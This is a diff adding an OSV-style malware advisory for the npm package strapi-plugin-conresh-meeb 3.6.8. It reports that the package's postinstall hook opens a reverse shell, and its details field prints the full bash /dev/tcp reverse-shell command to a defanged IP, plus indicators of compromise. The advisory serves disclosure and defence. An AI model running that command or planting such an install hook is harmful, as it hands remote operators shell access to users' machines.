@@ -1,0 +1,62 @@
+{
+  "schema_version": "1.6.0",
+  "id": "LWA-2026-12164",
+  "modified": "2026-09-16T07:27:06Z",
+  "published": "2026-09-16T07:26:49Z",
+  "summary": "Malicious code in strapi-plugin-conresh-meeb (npm)",
+  "details": "The postinstall hook (postinstall.js) opens a reverse shell to a fixed C2 endpoint. It first checks the hostname and only proceeds when it matches 'ubuntu-fc-uvm', then executes `bash -i \u003e\u0026 /dev/tcp/14[.]225[.]210[.]85/80 0\u003e\u00261`, retrying up to 5 times every 10 seconds and logging activity to /tmp/postinstall-revshell.log. Installing this package on a matching host grants the remote operator an interactive shell on the machine.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "npm",
+        "name": "strapi-plugin-conresh-meeb",
+        "purl": "pkg:npm/strapi-plugin-conresh-meeb"
+      },
+      "versions": [
+        "3.6.8"
+      ],
+      "database_specific": {
+        "cwes": [
+          {
+            "cweId": "CWE-506",
+            "name": "Embedded Malicious Code"
+          }
+        ]
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "PACKAGE",
+      "url": "https://www.npmjs.com/package/strapi-plugin-conresh-meeb/v/3.6.8"
+    },
+    {
+      "type": "REPORT",
+      "url": "https://threatintel.leitwacht.eu/d/LWA-2026-12164"
+    }
+  ],
+  "credits": [
+    {
+      "name": "Leitwacht",
+      "type": "FINDER",
+      "contact": [
+        "https://threatintel.leitwacht.eu"
+      ]
+    }
+  ],
+  "database_specific": {
+    "leitwacht": {
+      "category": "malware",
+      "first_seen_at": "2026-09-16T07:26:49Z",
+      "indicators_observed": {
+        "ip_observed": [
+          "14[.]225[.]210[.]85",
+          "14[.]225[.]210[.]85:80"
+        ],
+        "sha256": [
+          "6583c9f7c86133c060966b2c072341dccf85b5362304d1db3836beb5869599d4"
+        ]
+      }
+    }
+  }
+}
